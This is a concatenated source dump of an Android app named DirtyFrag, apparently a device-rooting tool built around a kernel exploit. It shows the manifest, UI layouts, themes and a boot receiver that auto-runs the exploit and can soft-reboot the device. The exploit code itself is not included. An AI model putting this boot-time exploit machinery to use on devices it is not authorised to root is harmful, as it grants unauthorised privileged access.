@@ -1,0 +1,4448 @@
+SOURCE CODE CONCATENATION
+Generated on: Tue Oct  6 17:21:49 UTC 2026
+Files included: .xml, .kt, .java
+============================================================
+
+FILE: ./app/src/main/AndroidManifest.xml
+============================================================
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android">
+
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+
+    <!-- Package visibility (Android 11+): without these, the app cannot see
+         the KernelSU managers and getLaunchIntentForPackage() returns null. -->
+    <queries>
+        <package android:name="me.weishu.kernelsu" />
+        <package android:name="com.rifsxd.ksunext" />
+        <package android:name="me.bmax.apatch" />
+    </queries>
+
+    <application
+        android:label="DirtyFrag"
+        android:allowBackup="false"
+        android:debuggable="true"
+        android:extractNativeLibs="true"
+        android:icon="@mipmap/ic_launcher"
+        android:roundIcon="@mipmap/ic_launcher_round"
+        android:theme="@style/Theme.DirtyFrag">
+
+        <activity
+            android:name=".MainActivity"
+            android:exported="true"
+            android:screenOrientation="portrait">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+
+        <receiver
+            android:name=".BootReceiver"
+            android:directBootAware="true"
+            android:enabled="false"
+            android:exported="false">
+            <intent-filter>
+                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+            </intent-filter>
+        </receiver>
+    </application>
+</manifest>
+
+============================================================
+
+FILE: ./app/src/main/res/drawable/bg_circle.xml
+============================================================
+<?xml version="1.0" encoding="utf-8"?>
+<shape xmlns:android="http://schemas.android.com/apk/res/android"
+    android:shape="oval">
+    <solid android:color="#FF1C1C1C" />
+</shape>
+
+============================================================
+
+FILE: ./app/src/main/res/drawable/dot_white.xml
+============================================================
+<?xml version="1.0" encoding="utf-8"?>
+<shape xmlns:android="http://schemas.android.com/apk/res/android"
+    android:shape="oval">
+    <solid android:color="#FFFFFFFF" />
+</shape>
+
+============================================================
+
+FILE: ./app/src/main/res/drawable/ic_more.xml
+============================================================
+<vector xmlns:android="http://schemas.android.com/apk/res/android"
+    android:width="24dp"
+    android:height="24dp"
+    android:viewportWidth="24"
+    android:viewportHeight="24">
+    <path
+        android:fillColor="#FFFFFFFF"
+        android:pathData="M12,8c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM12,10c-1.1,0 -2,0.9 -2,2s0.9,2 2,2 2,-0.9 2,-2 -0.9,-2 -2,-2zM12,16c-1.1,0 -2,0.9 -2,2s0.9,2 2,2 2,-0.9 2,-2 -0.9,-2 -2,-2z" />
+</vector>
+
+============================================================
+
+FILE: ./app/src/main/res/drawable/ic_play.xml
+============================================================
+<vector xmlns:android="http://schemas.android.com/apk/res/android"
+    android:width="24dp"
+    android:height="24dp"
+    android:viewportWidth="24"
+    android:viewportHeight="24">
+    <path
+        android:fillColor="#FFFFFFFF"
+        android:pathData="M8,5v14l11,-7z" />
+</vector>
+
+============================================================
+
+FILE: ./app/src/main/res/drawable/ic_share.xml
+============================================================
+<?xml version="1.0" encoding="utf-8"?>
+<vector xmlns:android="http://schemas.android.com/apk/res/android"
+    android:width="24dp"
+    android:height="24dp"
+    android:viewportWidth="24"
+    android:viewportHeight="24">
+    <path
+        android:fillColor="#FFFFFFFF"
+        android:pathData="M18,16.08c-0.76,0 -1.44,0.3 -1.96,0.77L8.91,12.7c0.05,-0.23 0.09,-0.46 0.09,-0.7s-0.04,-0.47 -0.09,-0.7l7.05,-4.11c0.54,0.5 1.25,0.81 2.04,0.81 1.66,0 3,-1.34 3,-3s-1.34,-3 -3,-3 -3,1.34 -3,3c0,0.24 0.04,0.47 0.09,0.7L8.04,9.81C7.5,9.31 6.79,9 6,9c-1.66,0 -3,1.34 -3,3s1.34,3 3,3c0.79,0 1.5,-0.31 2.04,-0.81l7.12,4.16c-0.05,0.21 -0.08,0.43 -0.08,0.65 0,1.61 1.31,2.92 2.92,2.92 1.61,0 2.92,-1.31 2.92,-2.92s-1.31,-2.92 -2.92,-2.92z" />
+</vector>
+============================================================
+
+FILE: ./app/src/main/res/drawable/ksu_logo.xml
+============================================================
+<vector xmlns:android="http://schemas.android.com/apk/res/android"
+    android:width="28dp"
+    android:height="28dp"
+    android:viewportWidth="60"
+    android:viewportHeight="60">
+    <!-- One solid black square minus two transparent square cutouts
+         (top-right and bottom-left). fillType=evenOdd turns the inner
+         subpaths into negative space - no strokes, no separator lines. -->
+    <path
+        android:fillColor="#FF000000"
+        android:fillType="evenOdd"
+        android:pathData="M0,0h60v60H0z M31,3h26v26h-26z M3,31h26v26h-26z" />
+</vector>
+
+============================================================
+
+FILE: ./app/src/main/res/drawable/menu_divider.xml
+============================================================
+<?xml version="1.0" encoding="utf-8"?>
+<!-- Popup menu divider: a thin grey line centered horizontally (symmetric
+     insets make it grow equally from the middle both ways). -->
+<inset xmlns:android="http://schemas.android.com/apk/res/android"
+    android:insetLeft="12dp"
+    android:insetRight="12dp">
+    <shape android:shape="rectangle">
+        <solid android:color="#FF3F3F3F" />
+    </shape>
+</inset>
+
+============================================================
+
+FILE: ./app/src/main/res/drawable/menu_item_bg.xml
+============================================================
+<?xml version="1.0" encoding="utf-8"?>
+<!-- Rounded highlight for popup menu items (matches the popup's corners). -->
+<ripple xmlns:android="http://schemas.android.com/apk/res/android"
+    android:color="#33FFFFFF">
+    <item>
+        <shape android:shape="rectangle">
+            <corners android:radius="18dp" />
+            <solid android:color="#00000000" />
+        </shape>
+    </item>
+</ripple>
+
+============================================================
+
+FILE: ./app/src/main/res/drawable/menu_item_ripple.xml
+============================================================
+<?xml version="1.0" encoding="utf-8"?>
+<!-- Grey press-highlight for popup menu rows (mono UI, no blue). -->
+<ripple xmlns:android="http://schemas.android.com/apk/res/android"
+    android:color="#4DC9C9C9">
+    <item android:id="@android:id/mask">
+        <shape android:shape="rectangle">
+            <solid android:color="#FFFFFFFF" />
+        </shape>
+    </item>
+</ripple>
+
+============================================================
+
+FILE: ./app/src/main/res/drawable/menu_row_highlight.xml
+============================================================
+<?xml version="1.0" encoding="utf-8"?>
+<!-- Grey press-highlight for submenu rows, rounded like the popup card.
+     Content matches the popup background: invisible at rest, opaque so the ripple always draws. -->
+<ripple xmlns:android="http://schemas.android.com/apk/res/android"
+    android:color="#66FFFFFF">
+    <item>
+        <shape android:shape="rectangle">
+            <corners android:radius="20dp" />
+            <solid android:color="#FF1C1C1C" />
+        </shape>
+    </item>
+</ripple>
+
+============================================================
+
+FILE: ./app/src/main/res/drawable/popup_bg.xml
+============================================================
+<?xml version="1.0" encoding="utf-8"?>
+<!-- Rounded dark popup background matching the autorun card. -->
+<shape xmlns:android="http://schemas.android.com/apk/res/android"
+    android:shape="rectangle">
+    <corners android:radius="26dp" />
+    <solid android:color="#FF1C1C1C" />
+</shape>
+
+============================================================
+
+FILE: ./app/src/main/res/font/inter.xml
+============================================================
+<?xml version="1.0" encoding="utf-8"?>
+<!-- Inter variable font (OFL, rsms/inter v4.1). Declared twice so regular
+     (400) and bold (700) text both resolve from the variable font's weight axis. -->
+<font-family xmlns:android="http://schemas.android.com/apk/res/android">
+    <font
+        android:font="@font/inter_vf"
+        android:fontStyle="normal"
+        android:fontWeight="400" />
+    <font
+        android:font="@font/inter_vf"
+        android:fontStyle="normal"
+        android:fontWeight="700" />
+</font-family>
+============================================================
+
+FILE: ./app/src/main/res/layout/activity_main.xml
+============================================================
+<?xml version="1.0" encoding="utf-8"?>
+<androidx.constraintlayout.widget.ConstraintLayout
+    xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:app="http://schemas.android.com/apk/res-auto"
+    android:layout_width="match_parent"
+    android:layout_height="match_parent"
+    android:fitsSystemWindows="true">
+
+    <com.google.android.material.appbar.AppBarLayout
+        android:id="@+id/appBarLayout"
+        android:layout_width="match_parent"
+        android:layout_height="wrap_content"
+        android:fitsSystemWindows="true"
+        app:layout_constraintStart_toStartOf="parent"
+        app:layout_constraintTop_toTopOf="parent">
+
+        <com.google.android.material.appbar.MaterialToolbar
+            android:id="@+id/toolbar"
+            android:layout_width="match_parent"
+            android:layout_height="56dp"
+            app:title="DirtyFrag"
+            app:titleMarginStart="32dp"
+            app:titleTextAppearance="@style/ToolbarTitle">
+
+            <!-- OneUI-style overflow button: grey circle, right edge aligned
+                 with the card toggles below (32dp from screen edge). -->
+            <ImageButton
+                android:id="@+id/btnMenu"
+                android:layout_width="44dp"
+                android:layout_height="44dp"
+                android:layout_gravity="end|center_vertical"
+                android:layout_marginEnd="16dp"
+                android:background="@drawable/bg_circle"
+                android:contentDescription="Menu"
+                android:scaleType="center"
+                android:src="@drawable/ic_more" />
+
+
+        </com.google.android.material.appbar.MaterialToolbar>
+
+    </com.google.android.material.appbar.AppBarLayout>
+
+    <!-- Invisible anchor for the popup menu: sits a bit right of and below
+         the circle button, so the popup overlaps the card below. -->
+    <View
+        android:id="@+id/menuAnchor"
+        android:layout_width="8dp"
+        android:layout_height="2dp"
+        android:layout_marginTop="0dp"
+        android:layout_marginEnd="8dp"
+        app:layout_constraintEnd_toEndOf="parent"
+        app:layout_constraintTop_toBottomOf="@+id/appBarLayout" />
+
+    <com.google.android.material.card.MaterialCardView
+        android:id="@+id/cardBoot"
+        android:layout_width="0dp"
+        android:layout_height="wrap_content"
+        android:layout_marginStart="16dp"
+        android:layout_marginEnd="16dp"
+        android:layout_marginTop="8dp"
+        app:cardBackgroundColor="#FF1C1C1C"
+        app:cardCornerRadius="26dp"
+        app:strokeWidth="0dp"
+        app:layout_constraintEnd_toEndOf="parent"
+        app:layout_constraintStart_toStartOf="parent"
+        app:layout_constraintTop_toBottomOf="@+id/appBarLayout">
+
+        <LinearLayout
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:orientation="vertical"
+            android:paddingStart="16dp"
+            android:paddingEnd="16dp"
+            android:paddingTop="10dp"
+            android:paddingBottom="10dp">
+
+            <LinearLayout
+                android:layout_width="match_parent"
+                android:layout_height="wrap_content"
+                android:orientation="horizontal"
+                android:paddingTop="6dp"
+                android:paddingBottom="6dp">
+
+                <LinearLayout
+                    android:layout_width="0dp"
+                    android:layout_height="wrap_content"
+                    android:layout_weight="1"
+                    android:layout_gravity="center_vertical"
+                    android:orientation="vertical">
+
+                    <TextView
+                        android:id="@+id/tvAutorunTitle"
+                        android:layout_width="match_parent"
+                        android:layout_height="wrap_content"
+                        android:text="Autorun"
+                        android:textColor="#FFFFFFFF"
+                        android:textSize="16sp" />
+
+                    <TextView
+                        android:id="@+id/tvAutorunDesc"
+                        android:layout_width="match_parent"
+                        android:layout_height="wrap_content"
+                        android:text="Runs the exploit after boot"
+                        android:textColor="#FF9E9E9E"
+                        android:textSize="12sp" />
+
+                </LinearLayout>
+
+                <df.root.OneUiSwitch
+                    android:id="@+id/switchBootStart"
+                    android:layout_width="wrap_content"
+                    android:layout_height="wrap_content"
+                    android:layout_gravity="center_vertical" />
+
+            </LinearLayout>
+
+            <LinearLayout
+                android:layout_width="match_parent"
+                android:layout_height="wrap_content"
+                android:orientation="horizontal"
+                android:paddingTop="6dp"
+                android:paddingBottom="6dp">
+
+                <LinearLayout
+                    android:layout_width="0dp"
+                    android:layout_height="wrap_content"
+                    android:layout_weight="1"
+                    android:layout_gravity="center_vertical"
+                    android:orientation="vertical">
+
+                    <TextView
+                        android:id="@+id/tvRebootTitle"
+                        android:layout_width="match_parent"
+                        android:layout_height="wrap_content"
+                        android:text="Auto reboot"
+                        android:textColor="#FFFFFFFF"
+                        android:textSize="16sp" />
+
+                    <TextView
+                        android:id="@+id/tvRebootDesc"
+                        android:layout_width="match_parent"
+                        android:layout_height="wrap_content"
+                        android:text="Soft reboots after root (Use with caution)"
+                        android:textColor="#FF9E9E9E"
+                        android:textSize="12sp" />
+
+                </LinearLayout>
+
+                <df.root.OneUiSwitch
+                    android:id="@+id/switchAutoSoftReboot"
+                    android:layout_width="wrap_content"
+                    android:layout_height="wrap_content"
+                    android:layout_gravity="center_vertical" />
+
+            </LinearLayout>
+
+        </LinearLayout>
+
+    </com.google.android.material.card.MaterialCardView>
+
+    <com.google.android.material.card.MaterialCardView
+        android:id="@+id/cardModules"
+        android:layout_width="0dp"
+        android:layout_height="wrap_content"
+        android:layout_marginStart="16dp"
+        android:layout_marginEnd="16dp"
+        android:layout_marginTop="12dp"
+        app:cardBackgroundColor="#FF1C1C1C"
+        app:cardCornerRadius="26dp"
+        app:strokeWidth="0dp"
+        app:layout_constraintEnd_toEndOf="parent"
+        app:layout_constraintStart_toStartOf="parent"
+        app:layout_constraintTop_toBottomOf="@+id/cardBoot">
+
+        <LinearLayout
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:orientation="horizontal"
+            android:paddingStart="16dp"
+            android:paddingEnd="16dp"
+            android:paddingTop="10dp"
+            android:paddingBottom="10dp">
+
+            <LinearLayout
+                android:layout_width="0dp"
+                android:layout_height="wrap_content"
+                android:layout_weight="1"
+                android:layout_gravity="center_vertical"
+                android:orientation="vertical"
+                android:paddingTop="6dp"
+                android:paddingBottom="6dp">
+
+                <TextView
+                    android:layout_width="match_parent"
+                    android:layout_height="wrap_content"
+                    android:text="KernelSU Modules"
+                    android:textColor="#FFFFFFFF"
+                    android:textSize="16sp" />
+
+                <TextView
+                    android:id="@+id/modulesSubtitle"
+                    android:layout_width="match_parent"
+                    android:layout_height="wrap_content"
+                    android:text="Enabled - active at next reboot"
+                    android:textColor="#FF9E9E9E"
+                    android:textSize="12sp" />
+
+            </LinearLayout>
+
+            <df.root.OneUiSwitch
+                android:id="@+id/switchModules"
+                android:layout_width="wrap_content"
+                android:layout_height="wrap_content"
+                android:layout_gravity="center_vertical"
+                android:checked="true" />
+
+        </LinearLayout>
+
+    </com.google.android.material.card.MaterialCardView>
+
+    <com.google.android.material.card.MaterialCardView
+        android:id="@+id/cardLog"
+        android:layout_width="0dp"
+        android:layout_height="wrap_content"
+        android:layout_marginStart="16dp"
+        android:layout_marginEnd="16dp"
+        android:layout_marginTop="12dp"
+        app:cardBackgroundColor="#FF1C1C1C"
+        app:cardCornerRadius="26dp"
+        app:strokeWidth="0dp"
+        app:layout_constraintEnd_toEndOf="parent"
+        app:layout_constraintStart_toStartOf="parent"
+        app:layout_constraintTop_toBottomOf="@+id/cardModules">
+
+        <LinearLayout
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:orientation="horizontal"
+            android:paddingStart="16dp"
+            android:paddingEnd="16dp"
+            android:paddingTop="10dp"
+            android:paddingBottom="10dp">
+
+            <LinearLayout
+                android:layout_width="0dp"
+                android:layout_height="wrap_content"
+                android:layout_weight="1"
+                android:layout_gravity="center_vertical"
+                android:orientation="vertical"
+                android:paddingTop="6dp"
+                android:paddingBottom="6dp">
+
+                <TextView
+                    android:layout_width="match_parent"
+                    android:layout_height="wrap_content"
+                    android:text="Show advanced log"
+                    android:textColor="#FFFFFFFF"
+                    android:textSize="16sp" />
+
+                <TextView
+                    android:layout_width="match_parent"
+                    android:layout_height="wrap_content"
+                    android:text="Shows full log in addition to simple status"
+                    android:textColor="#FF9E9E9E"
+                    android:textSize="12sp" />
+
+            </LinearLayout>
+
+            <df.root.OneUiSwitch
+                android:id="@+id/switchAdvancedLog"
+                android:layout_width="wrap_content"
+                android:layout_height="wrap_content"
+                android:layout_gravity="center_vertical" />
+
+        </LinearLayout>
+
+    </com.google.android.material.card.MaterialCardView>
+
+    <ScrollView
+        android:id="@+id/outputScroll"
+        android:layout_width="0dp"
+        android:layout_height="0dp"
+        android:layout_marginStart="32dp"
+        android:layout_marginEnd="32dp"
+        android:layout_marginTop="12dp"
+        android:layout_marginBottom="16dp"
+        android:scrollbars="none"
+        app:layout_constraintBottom_toBottomOf="parent"
+        app:layout_constraintEnd_toEndOf="parent"
+        app:layout_constraintStart_toStartOf="parent"
+        app:layout_constraintTop_toBottomOf="@+id/cardLog">
+
+        <TextView
+            android:id="@+id/outputView"
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:textColor="#FFB3B3B3"
+            android:textIsSelectable="false"
+            android:textSize="11sp" />
+
+    </ScrollView>
+
+    <!-- Share log button: right side, same row as the log's first line -->
+    <com.google.android.material.button.MaterialButton
+        android:id="@+id/btnShareLog"
+        style="@style/Widget.Material3.Button.IconButton"
+        android:layout_width="44dp"
+        android:layout_height="44dp"
+        android:layout_marginEnd="32dp"
+        android:layout_marginTop="12dp"
+        android:contentDescription="Save log to Downloads"
+        app:icon="@drawable/ic_share"
+        app:iconGravity="textStart"
+        app:iconSize="22dp"
+        app:iconTint="#FFC9C9C9"
+        app:layout_constraintEnd_toEndOf="parent"
+        app:layout_constraintTop_toBottomOf="@+id/cardLog" />
+
+    <!-- OneUI-style bottom fade over the log -->
+    <df.root.BottomFadeView
+        android:id="@+id/bottomFade"
+        android:layout_width="0dp"
+        android:layout_height="400dp"
+        android:clickable="false"
+        android:focusable="false"
+        app:layout_constraintBottom_toBottomOf="parent"
+        app:layout_constraintEnd_toEndOf="parent"
+        app:layout_constraintStart_toStartOf="parent" />
+
+    <!-- OneUI-update-style two-step progress bar -->
+    <df.root.TwoStepProgressView
+        android:id="@+id/twoStep"
+        android:layout_width="0dp"
+        android:layout_height="wrap_content"
+        android:layout_marginStart="32dp"
+        android:layout_marginEnd="32dp"
+        android:layout_marginBottom="6dp"
+        app:layout_constraintBottom_toTopOf="@+id/btnRun"
+        app:layout_constraintEnd_toEndOf="parent"
+        app:layout_constraintStart_toStartOf="parent" />
+
+    <!-- Left-edge anchor for the pill: (1-0.48)/2 = 26% â€” the fresh pill's
+         left edge, which must never move during the shrink animation. -->
+    <androidx.constraintlayout.widget.Guideline
+        android:id="@+id/glPillStart"
+        android:layout_width="wrap_content"
+        android:layout_height="wrap_content"
+        android:orientation="vertical"
+        app:layout_constraintGuide_percent="0.26" />
+
+    <!-- OneUI search-bar style floating pill -->
+    <Button
+        android:id="@+id/btnRun"
+        android:layout_width="0dp"
+        android:layout_height="54dp"
+        android:layout_marginBottom="28dp"
+        android:insetTop="0dp"
+        android:insetBottom="0dp"
+        android:paddingStart="28dp"
+        android:paddingEnd="28dp"
+        android:elevation="12dp"
+        android:stateListAnimator="@null"
+        android:text="Run exploit"
+        android:textSize="16sp"
+        android:backgroundTint="#FF7A7A7A"
+        android:textColor="#FFE0E0E0"
+        app:layout_constraintBottom_toBottomOf="parent"
+        app:layout_constraintEnd_toEndOf="parent"
+        app:layout_constraintHorizontal_bias="0"
+        app:layout_constraintStart_toStartOf="@+id/glPillStart"
+        app:layout_constraintWidth_percent="0.48"
+        app:strokeWidth="0.5dp"
+        app:strokeColor="#FFA6A6A6" />
+
+    <!-- KSU launcher circle: pops up next to the pill while running/rooted,
+         lights up once root is successful. -->
+    <ImageButton
+        android:id="@+id/btnKsu"
+        android:layout_width="54dp"
+        android:layout_height="54dp"
+        android:layout_marginStart="12dp"
+        android:layout_marginBottom="28dp"
+        android:background="@drawable/bg_circle"
+        android:backgroundTint="#FF2E2E30"
+        android:contentDescription="Open KernelSU"
+        android:elevation="12dp"
+        android:enabled="false"
+        android:scaleType="centerInside"
+        android:src="@drawable/ksu_logo"
+        android:visibility="gone"
+        app:layout_constraintBottom_toBottomOf="parent"
+        app:layout_constraintEnd_toEndOf="parent"
+        app:layout_constraintHorizontal_bias="0"
+        app:layout_constraintStart_toEndOf="@+id/btnRun" />
+
+    <!-- Dim overlay: darkens the app 50% while the submenu is visible. -->
+    <View
+        android:id="@+id/dimOverlay"
+        android:layout_width="0dp"
+        android:layout_height="0dp"
+        android:background="@color/black"
+        android:elevation="30dp"
+        android:visibility="gone"
+        app:layout_constraintBottom_toBottomOf="parent"
+        app:layout_constraintEnd_toEndOf="parent"
+        app:layout_constraintStart_toStartOf="parent"
+        app:layout_constraintTop_toTopOf="parent" />
+
+</androidx.constraintlayout.widget.ConstraintLayout>
+
+============================================================
+
+FILE: ./app/src/main/res/menu/menu_main.xml
+============================================================
+<?xml version="1.0" encoding="utf-8"?>
+<menu xmlns:android="http://schemas.android.com/apk/res/android">
+    <item
+        android:id="@+id/menu_github"
+        android:title="Github Page" />
+    <item
+        android:id="@+id/menu_expert"
+        android:title="Expert mode" />
+    <item
+        android:id="@+id/menu_remove"
+        android:title="Remove KSU/KSUD" />
+</menu>
+
+============================================================
+
+FILE: ./app/src/main/res/mipmap-anydpi-v26/ic_launcher.xml
+============================================================
+<?xml version="1.0" encoding="utf-8"?>
+<adaptive-icon xmlns:android="http://schemas.android.com/apk/res/android">
+    <background android:drawable="@color/ic_launcher_background" />
+    <foreground android:drawable="@mipmap/ic_launcher_foreground" />
+    <!-- Tinted with the system color palette (Material You themed icons) on Android 13+ -->
+    <monochrome android:drawable="@mipmap/ic_launcher_foreground" />
+</adaptive-icon>
+
+============================================================
+
+FILE: ./app/src/main/res/mipmap-anydpi-v26/ic_launcher_round.xml
+============================================================
+<?xml version="1.0" encoding="utf-8"?>
+<adaptive-icon xmlns:android="http://schemas.android.com/apk/res/android">
+    <background android:drawable="@color/ic_launcher_background" />
+    <foreground android:drawable="@mipmap/ic_launcher_foreground" />
+    <!-- Tinted with the system color palette (Material You themed icons) on Android 13+ -->
+    <monochrome android:drawable="@mipmap/ic_launcher_foreground" />
+</adaptive-icon>
+
+============================================================
+
+FILE: ./app/src/main/res/values/colors.xml
+============================================================
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <color name="black">#FF000000</color>
+    <color name="white">#FFFFFFFF</color>
+    <!-- Dark backdrop for the white grenade foreground; gets tinted by the system palette via themed icons -->
+    <color name="ic_launcher_background">#FF1C1B1F</color>
+</resources>
+
+============================================================
+
+FILE: ./app/src/main/res/values/themes.xml
+============================================================
+<resources>
+    <style name="Theme.DirtyFrag" parent="Theme.Material3.DynamicColors.DayNight.NoActionBar">
+        <item name="android:fontFamily">@font/inter</item>
+        <item name="fontFamily">@font/inter</item>
+        <item name="android:windowBackground">@color/black</item>
+        <item name="android:statusBarColor">@color/black</item>
+        <item name="android:navigationBarColor">@color/black</item>
+        <item name="colorSurface">@color/black</item>
+        <item name="colorSurfaceContainerLow">@color/black</item>
+        <item name="colorSurfaceContainer">@color/black</item>
+        <item name="colorSurfaceContainerHigh">@color/black</item>
+        <item name="colorSurfaceContainerHighest">@color/black</item>
+        <item name="colorOutline">#FFE8E8E8</item>
+        <!-- Card-styled popup menu (rounded #1C1C1C background). -->
+        <item name="popupMenuStyle">@style/DF_PopupMenu</item>
+        <item name="android:popupMenuStyle">@style/DF_PopupMenu</item>
+        <item name="actionOverflowMenuStyle">@style/DF_OverflowMenu</item>
+        <!-- Must live on the theme (not the popup style): the popup's ListView
+             reads this attr from the activity theme. Provides the centered
+             divider between menu items. -->
+        <item name="dropDownListViewStyle">@style/DF_DropDownListView</item>
+        <item name="android:itemTextAppearance">@style/DF_MenuText</item>
+        <item name="textAppearanceListItemSmall">@style/DF_MenuText</item>
+        <!-- Popup sizing: taller rows, narrower side padding. -->
+        <item name="listPreferredItemHeightSmall">56dp</item>
+        <item name="listPreferredItemPaddingLeft">12dp</item>
+        <item name="listPreferredItemPaddingRight">12dp</item>
+    </style>
+    <style name="DF_MenuText" parent="TextAppearance.AppCompat">
+        <item name="android:textSize">15sp</item>
+        <item name="android:textColor">#FFE8E8E8</item>
+        <item name="android:gravity">center</item>
+    </style>
+    <style name="ShapeCircle">
+        <item name="cornerFamily">rounded</item>
+        <item name="cornerSize">50%</item>
+    </style>
+    <style name="DF_PopupMenu" parent="Widget.Material3.PopupMenu">
+        <item name="android:popupBackground">@drawable/popup_bg</item>
+        <item name="android:popupElevation">24dp</item>
+    </style>
+    <style name="DF_OverflowMenu" parent="Widget.Material3.PopupMenu.Overflow">
+        <item name="android:popupBackground">@drawable/popup_bg</item>
+        <item name="android:popupElevation">24dp</item>
+    </style>
+    <style name="DF_DropDownListView" parent="Widget.AppCompat.ListView.DropDown">
+        <item name="android:divider">@drawable/menu_divider</item>
+        <item name="android:dividerHeight">1dp</item>
+        <item name="android:listSelector">@drawable/menu_item_ripple</item>
+    </style>
+    <!-- OneUI-style bold toolbar title -->
+    <style name="ToolbarTitle" parent="TextAppearance.Material3.TitleLarge">
+        <item name="android:fontFamily">@font/inter</item>
+        <item name="fontFamily">@font/inter</item>
+        <item name="android:textFontWeight">700</item>
+        <item name="android:textSize">24sp</item>
+        <item name="android:textStyle">bold</item>
+        <item name="android:textColor">@color/white</item>
+    </style>
+</resources>
+
+============================================================
+
+FILE: ./app/src/main/res/values-night/themes.xml
+============================================================
+<resources />
+
+============================================================
+
+FILE: ./app/src/main/res/values-v31/themes.xml
+============================================================
+<resources>
+    <!-- v31+: kill the system splash-screen icon - plain black, so the app
+         contents appear as soon as the window shows. -->
+    <style name="Theme.DirtyFrag" parent="Theme.Material3.DynamicColors.DayNight.NoActionBar">
+        <item name="android:fontFamily">@font/inter</item>
+        <item name="fontFamily">@font/inter</item>
+        <item name="android:windowBackground">@color/black</item>
+        <item name="android:statusBarColor">@color/black</item>
+        <item name="android:navigationBarColor">@color/black</item>
+        <item name="colorSurface">@color/black</item>
+        <item name="colorSurfaceContainerLow">@color/black</item>
+        <item name="colorSurfaceContainer">@color/black</item>
+        <item name="colorSurfaceContainerHigh">@color/black</item>
+        <item name="colorSurfaceContainerHighest">@color/black</item>
+        <item name="colorOutline">#FFE8E8E8</item>
+        <!-- Card-styled popup menu (rounded #1C1C1C background). -->
+        <item name="popupMenuStyle">@style/DF_PopupMenu</item>
+        <item name="android:popupMenuStyle">@style/DF_PopupMenu</item>
+        <item name="actionOverflowMenuStyle">@style/DF_OverflowMenu</item>
+        <!-- Must live on the theme (not the popup style): the popup's ListView
+             reads this attr from the activity theme. Provides the centered
+             divider between menu items. -->
+        <item name="dropDownListViewStyle">@style/DF_DropDownListView</item>
+        <item name="android:itemTextAppearance">@style/DF_MenuText</item>
+        <item name="textAppearanceListItemSmall">@style/DF_MenuText</item>
+        <!-- Popup sizing: taller rows, narrower side padding. -->
+        <item name="listPreferredItemHeightSmall">56dp</item>
+        <item name="listPreferredItemPaddingLeft">12dp</item>
+        <item name="listPreferredItemPaddingRight">12dp</item>
+        <item name="android:windowSplashScreenBackground">@android:color/transparent</item>
+        <item name="android:windowSplashScreenAnimatedIcon">@android:color/transparent</item>
+    </style>
+</resources>
+
+============================================================
+
+FILE: ./app/src/main/java/df/root/BootReceiver.java
+============================================================
+package df.root;
+
+import android.content.BroadcastReceiver;
+import android.content.ComponentName;
+import android.content.Context;
+import android.content.Intent;
+import android.content.pm.PackageManager;
+import android.os.PowerManager;
+import android.util.Log;
+
+import java.io.File;
+
+/**
+ * Auto-root on boot. Safety rules learned in the field:
+ *  - NEVER soft-reboot during a boot-time run (that was the brick vector).
+ *  - A failed run disables the receiver; the user re-enables it in the app.
+ */
+public class BootReceiver extends BroadcastReceiver implements IReporter {
+    private static final String TAG = "dfroot";
+
+    @Override
+    public void report(String msg) {
+        Log.i(TAG, msg.trim());
+    }
+
+    @Override
+    public void onReceive(Context context, Intent intent) {
+        if (new File("/dev/df").exists()) {
+            Log.i(TAG, "boot: already hooked, skipping");
+            return;
+        }
+        Log.i(TAG, "boot: " + intent.getAction());
+        final Context deCtx = context.createDeviceProtectedStorageContext();
+        boolean expert = deCtx.getSharedPreferences("dfroot", Context.MODE_PRIVATE)
+                .getBoolean("expert_mode", false);
+        if (!expert) {
+            Log.i(TAG, "boot: expert mode off - autorun skipped");
+            return;
+        }
+        boolean autoSoftReboot = deCtx.getSharedPreferences("dfroot", Context.MODE_PRIVATE)
+                .getBoolean("auto_soft_reboot", false);
+
+        PowerManager pm = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
+        PowerManager.WakeLock wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "dfroot:boot");
+        wl.acquire();
+        new Thread(() -> {
+            boolean ok = false;
+            try {
+                // auto_soft_reboot=true: on success, ksud triggers its OWN soft
+                // reboot after late-load completes - so Zygisk/LSPosed modules
+                // (which need a fresh Zygote with the module loaded) become
+                // active in the same power session. With it off, the exploit
+                // still roots the device but nothing reboots. Manual button
+                // runs are never affected by this setting.
+                int rc = ExploitRunner.run(deCtx, this, autoSoftReboot);
+                Log.i(TAG, "boot: exploit rc=" + rc);
+                ok = rc == 0;
+            } catch (Exception e) {
+                Log.e(TAG, "boot: exploit exception", e);
+            } finally {
+                wl.release();
+            }
+            if (!ok) {
+                Log.i(TAG, "boot: failed - disabling autorun interlock");
+                context.getPackageManager().setComponentEnabledSetting(
+                        new ComponentName(context, BootReceiver.class),
+                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                        PackageManager.DONT_KILL_APP);
+            }
+        }, "dfroot-boot").start();
+    }
+}
+============================================================
+
+FILE: ./app/src/main/java/df/root/BottomFadeView.java
+============================================================
+package df.root;
+
+import android.content.Context;
+import android.graphics.Canvas;
+import android.graphics.Color;
+import android.graphics.LinearGradient;
+import android.graphics.Paint;
+import android.graphics.Shader;
+import android.util.AttributeSet;
+import android.view.View;
+
+/**
+ * OneUI-style bottom fade. Draws a LinearGradient with explicit positions
+ * so the curve can be aggressive (steep late falloff) while still starting
+ * at fully transparent - no visible seam at the top edge.
+ */
+public class BottomFadeView extends View {
+
+    private final Paint paint = new Paint();
+
+    // Fade curve: transparent -> 40% at 32% -> 90% at 60% -> solid from 82%.
+    private static final int[] COLORS = {
+            0x00000000,
+            0x66000000,
+            0xE6000000,
+            0xFF000000,
+            0xFF000000
+    };
